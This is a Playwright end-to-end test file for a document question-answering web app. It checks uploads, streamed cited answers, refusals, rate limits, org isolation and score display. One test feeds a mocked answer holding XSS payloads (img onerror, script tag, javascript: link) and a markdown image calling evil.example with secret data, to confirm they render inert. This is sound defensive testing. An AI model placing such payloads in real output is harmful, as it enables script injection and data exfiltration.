import { expect, test } from "@playwright/test";

import {
  CSRF_HEADER,
  CSRF_VALUE,
  POLICY,
  escapeRegExp,
  registerAndLogin,
  uploadDocument,
} from "./helpers";

/* Tests 4, 5, 6, 7, 8, 9 and 12 from the phase skill's required list. */

test("5. upload reaches ready, and oversize files are refused", async ({ page }) => {
  await registerAndLogin(page);

  await uploadDocument(page, "remote-work-policy.md", POLICY);

  const row = page.getByRole("row", { name: /remote-work-policy\.md/ });
  await expect(row.getByText(/ready/i)).toBeVisible();

  // Oversize: refused in the browser, BEFORE any bytes are sent, so
  // the user gets a sentence instead of a platform error page after a
  // slow upload.
  const big = "x".repeat(5 * 1024 * 1024);
  await page.locator('input[type="file"]').setInputFiles({
    name: "too-big.md",
    mimeType: "text/markdown",
    buffer: Buffer.from(big, "utf-8"),
  });
  await expect(page.getByText(/some files were not uploaded/i)).toBeVisible();
  await expect(page.getByText(/the limit is/i)).toBeVisible();

  // A rejected type is named with its reason too, not silently dropped.
  await page.locator('input[type="file"]').setInputFiles({
    name: "notes.docx",
    mimeType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    buffer: Buffer.from("irrelevant", "utf-8"),
  });
  await expect(page.getByText(/only \.pdf, \.md, \.txt/i)).toBeVisible();
});

test("6. chat streams an answer and a citation opens the right source", async ({
  page,
}) => {
  await registerAndLogin(page);
  await uploadDocument(page, "remote-work-policy.md", POLICY);

  await page.goto("/chat");
  await page.getByPlaceholder("Ask about your documents").fill(
    "What are the core hours for remote employees?",
  );
  await page.getByRole("button", { name: /^ask$/i }).click();

  // The answer arrives.
  await expect(page.getByText(/10:00/).first()).toBeVisible({ timeout: 30_000 });

  // Trace chips come from real backend fields.
  await expect(page.getByText(/retrieve/).first()).toBeVisible();
  await expect(page.getByText(/candidates/).first()).toBeVisible();

  // Clicking the inline citation opens the panel with the right file.
  await page.getByRole("button", { name: /show source 1/i }).first().click();
  const panel = page.getByRole("complementary", { name: /sources/i });
  await expect(panel).toBeVisible();
  await expect(panel.getByText(/remote-work-policy\.md/)).toBeVisible();
  await expect(panel.getByText(/^p\.\d+$/)).toBeVisible();
  // The passage the model actually read, not just a filename.
  await expect(panel.getByText(/reachable between/i)).toBeVisible();
});

test("7a. a refusal is shown as information, not as an error", async ({ page }) => {
  await registerAndLogin(page);
  await uploadDocument(page, "remote-work-policy.md", POLICY);

  await page.goto("/chat");
  await page
    .getByPlaceholder("Ask about your documents")
    .fill("What is the airspeed velocity of an unladen swallow?");
  await page.getByRole("button", { name: /^ask$/i }).click();

  await expect(
    page.getByText(/couldn't answer that from your documents/i),
  ).toBeVisible({ timeout: 30_000 });
  // And it tells the user what they CAN ask -- the thing the original
  // blunt refusal did not.
  await expect(page.getByText(/you can ask about/i)).toBeVisible();
});

test("7b. a greeting is answered conversationally, with no retrieval", async ({
  page,
}) => {
  await registerAndLogin(page);
  await uploadDocument(page, "remote-work-policy.md", POLICY);

  await page.goto("/chat");
  await page.getByPlaceholder("Ask about your documents").fill("hello");
  await page.getByRole("button", { name: /^ask$/i }).click();

  await expect(page.getByText(/I answer questions using your organization/i)).toBeVisible({
    timeout: 20_000,
  });
  // No trace chips: nothing ran, so nothing is reported.
  await expect(page.getByText(/retrieve \d+ ms/)).toHaveCount(0);
  // And it is not dressed up as a refusal.
  await expect(page.getByText(/couldn't answer that/i)).toHaveCount(0);
});

test("7c. a 429 surfaces a wait, taken from Retry-After", async ({ page }) => {
  await registerAndLogin(page);

  // POST only. The same URL pattern matches the GET that loads
  // history, and intercepting that broke the screen outright -- which
  // showed up as "the expected text never appeared" rather than as
  // anything to do with history.
  await page.route("**/api/conversations/*/messages", (route) => {
    if (route.request().method() !== "POST") return route.fallback();
    return route.fulfill({
      status: 429,
      headers: { "retry-after": "17" },
      contentType: "application/json",
      body: JSON.stringify({ error: "Too many answers are being generated." }),
    });
  });

  await page.goto("/chat");
  await page.getByPlaceholder("Ask about your documents").fill("anything at all");
  await page.getByRole("button", { name: /^ask$/i }).click();

  // The countdown comes from the header, not from a guess.
  await expect(page.getByText(/17s/)).toBeVisible({ timeout: 20_000 });
});

test("7d. Stop abandons the answer", async ({ page }) => {
  await registerAndLogin(page);
  await uploadDocument(page, "remote-work-policy.md", POLICY);

  // A request that never answers, so Stop has something to
  // interrupt.
  //
  // `route.fulfill` with a body COMPLETES the response, which ends
  // the stream before the test can see the Stop button -- the first
  // version of this test asserted against an already-finished turn.
  // Delaying the fulfilment keeps the fetch pending instead.
  await page.route("**/api/conversations/*/messages", async (route) => {
    if (route.request().method() !== "POST") return route.fallback();
    await new Promise((resolve) => setTimeout(resolve, 30_000));
    await route.fulfill({
      status: 200,
      headers: { "content-type": "text/event-stream" },
      body: `event: done
data: {}

`,
    });
  });

  await page.goto("/chat");
  await page.getByPlaceholder("Ask about your documents").fill("core hours");
  await page.getByRole("button", { name: /^ask$/i }).click();

  // While streaming the composer offers Stop instead of Ask.
  const stop = page.getByRole("button", { name: /^stop$/i });
  await expect(stop).toBeVisible({ timeout: 20_000 });
  await stop.click();
  await expect(page.getByText(/you stopped this answer/i)).toBeVisible();
});

test("8. a hostile answer renders inert: no script, no image, no javascript: link", async ({
  page,
}) => {
  await registerAndLogin(page);

  const hostile = [
    "Here is a result.",
    "",
    '<img src=x onerror="window.__XSS_IMG=1">',
    "",
    "<script>window.__XSS_SCRIPT=1</script>",
    "",
    "![leak](https://evil.example/pixel.png?d=secret)",
    "",
    "[click me](javascript:window.__XSS_LINK=1)",
    "",
    "[real link](https://example.com/ok)",
  ].join("\n");

  await page.route("**/api/conversations/*/messages", (route) => {
    if (route.request().method() !== "POST") return route.fallback();
    return route.fulfill({
      status: 200,
      headers: {
        "content-type": "text/event-stream",
        "cache-control": "no-cache, no-transform",
      },
      body:
        `event: token\ndata: ${JSON.stringify({ text: hostile })}\n\n` +
        `event: citations\ndata: ${JSON.stringify({
          answer: hostile,
          citations: [],
          cached: false,
          gated: false,
          kind: "answer",
          rewritten_question: null,
          confidence: null,
          scores_calibrated: false,
          used_reranker_fallback: false,
          candidate_count: 1,
          parent_count: 1,
          retrieve_ms: 5,
          rerank_ms: 5,
          first_token_ms: 5,
        })}\n\n` +
        `event: done\ndata: {}\n\n`,
    });
  });

  const requested: string[] = [];
  page.on("request", (r) => requested.push(r.url()));

  await page.goto("/chat");
  await page.getByPlaceholder("Ask about your documents").fill("anything");
  await page.getByRole("button", { name: /^ask$/i }).click();
  await expect(page.getByText(/here is a result/i)).toBeVisible({ timeout: 20_000 });

  // Nothing executed.
  const flags = await page.evaluate(() => ({
    img: (window as never as Record<string, unknown>).__XSS_IMG ?? null,
    script: (window as never as Record<string, unknown>).__XSS_SCRIPT ?? null,
    link: (window as never as Record<string, unknown>).__XSS_LINK ?? null,
  }));
  expect(flags).toEqual({ img: null, script: null, link: null });

  // No <img> at all -- images are stripped, not allowlisted, because an
  // image URL in a generated answer is an exfiltration channel that
  // fires on render with no click.
  await expect(page.locator("main img")).toHaveCount(0);
  expect(requested.some((u) => u.includes("evil.example"))).toBe(false);

  // A javascript: href must not survive sanitisation.
  const hrefs = await page.locator("main a").evaluateAll((els) =>
    els.map((e) => (e as HTMLAnchorElement).getAttribute("href") ?? ""),
  );
  expect(hrefs.some((h) => h.toLowerCase().startsWith("javascript:"))).toBe(false);
  // The legitimate link survives, and opens safely.
  const rels = await page.locator("main a").evaluateAll((els) =>
    els.map((e) => (e as HTMLAnchorElement).rel),
  );
  if (rels.length > 0) {
    expect(rels.every((r) => r.includes("noopener") && r.includes("noreferrer"))).toBe(true);
  }
});

test("9. one org cannot reach another org's document", async ({ page, request }) => {
  // Org A uploads something with a distinctive phrase.
  await registerAndLogin(page);
  await uploadDocument(
    page,
    "secret-a.md",
    "# Secret A\n\nThe zarnex settlement schedule is reviewed quarterly.\n",
  );
  const rows = await page.evaluate(async () => {
    const res = await fetch("/api/documents");
    return (await res.json()) as Array<{ id: string }>;
  });
  const orgADocumentId = rows[0]!.id;

  // Org B, in a clean browser context.
  await page.context().clearCookies();
  await registerAndLogin(page);

  const status = await page.evaluate(async (id) => {
    const res = await fetch(`/api/documents/${id}`);
    return res.status;
  }, orgADocumentId);

  // 404, not 403: a 403 would confirm the id exists somewhere.
  expect(status).toBe(404);

  // And the phrase appears nowhere org B can see.
  await page.goto("/documents");
  const body = await page.locator("body").innerText();
  expect(body).not.toContain("zarnex");
  void request;
  void CSRF_HEADER;
  void CSRF_VALUE;
  void escapeRegExp;
});

test("12. score and confidence are hidden when scores are not calibrated", async ({
  page,
}) => {
  await registerAndLogin(page);

  await page.route("**/api/conversations/*/messages", (route) => {
    if (route.request().method() !== "POST") return route.fallback();
    return route.fulfill({
      status: 200,
      headers: {
        "content-type": "text/event-stream",
        "cache-control": "no-cache, no-transform",
      },
      body:
        `event: token\ndata: ${JSON.stringify({ text: "An answer [1]." })}\n\n` +
        `event: citations\ndata: ${JSON.stringify({
          answer: "An answer [1].",
          citations: [
            {
              marker: 1,
              document: "policy.md",
              document_id: "11111111-1111-1111-1111-111111111111",
              chunk_id: "22222222-2222-2222-2222-222222222222",
              page: 1,
              snippet: "a snippet",
              passage: "a passage from the document",
              matched_chunk_id: null,
              // Null because the ranking was NOT calibrated.
              score: null,
            },
          ],
          cached: false,
          gated: false,
          kind: "answer",
          rewritten_question: null,
          confidence: null,
          // The flag under test.
          scores_calibrated: false,
          used_reranker_fallback: true,
          candidate_count: 4,
          parent_count: 1,
          retrieve_ms: 12,
          rerank_ms: 9,
          first_token_ms: 30,
        })}\n\n` +
        `event: done\ndata: {}\n\n`,
    });
  });

  await page.goto("/chat");
  await page.getByPlaceholder("Ask about your documents").fill("anything");
  await page.getByRole("button", { name: /^ask$/i }).click();
  await expect(page.getByText(/an answer/i).first()).toBeVisible({ timeout: 20_000 });

  // No confidence chip.
  await expect(page.getByText(/confidence/i)).toHaveCount(0);

  // No relevance meter in the sources panel either: an uncalibrated
  // score is a rank reciprocal, and drawing it in a 0..1 bar would
  // read as "almost no match" for every source of every answer.
  await page.getByRole("button", { name: /show source 1/i }).first().click();
  await expect(page.getByRole("meter", { name: /relevance/i })).toHaveCount(0);
  // The passage still shows -- it is text, not a statistic.
  await expect(page.getByText(/a passage from the document/i)).toBeVisible();
});
